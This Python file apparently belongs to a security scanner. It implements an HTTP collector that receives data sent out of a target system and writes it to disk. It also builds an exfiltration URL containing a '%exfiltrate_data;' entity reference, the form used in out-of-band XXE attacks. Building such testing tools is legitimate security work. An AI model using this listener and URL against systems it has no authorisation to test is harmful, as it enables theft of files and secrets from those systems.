import asyncore
import base
import logging
import os.path
import re
import urllib
import uuid


class HTTPHandler(base.BaseHandler):
    def __init__(self, server, conn, addr):
        base.BaseHandler.__init__(self, server, conn, addr)

        self.set_terminator(b"\r\n")

        logging.info("HTTP connection from {}".format(self.addr))

    def found_terminator(self):
        data = b"".join(self.ibuffer)
        self.ibuffer = []

        m = re.search(r'GET /(?P<scan_id>[a-z0-9\-]+)/(?P<data>.*) HTTP/',
                      data, re.DOTALL)
        if m:
            self.scan_id = m.group('scan_id')
            self.file_id = str(uuid.uuid4())
            with open(os.path.join(self.server.output_dir, self.file_id),
                      'wb') as f:
                f.write(urllib.unquote(m.group('data')))

        self.close_when_done()

    def handle_close(self):
        base.BaseHandler.handle_close(self)


class HTTPCollector(base.BaseCollector):
    def get_exfil_url(self, scan_id):
        return "http://{0}:{1}/{2}/%exfiltrate_data;".format(
            self.addr[0], self.addr[1], scan_id)

    def run(self):
        base.BaseServer(self.addr, HTTPHandler, self.output_dir, self.queue)
        asyncore.loop()


if __name__ == '__main__':
    base.BaseServer(('', 8581), HTTPHandler, '/tmp')
    asyncore.loop()
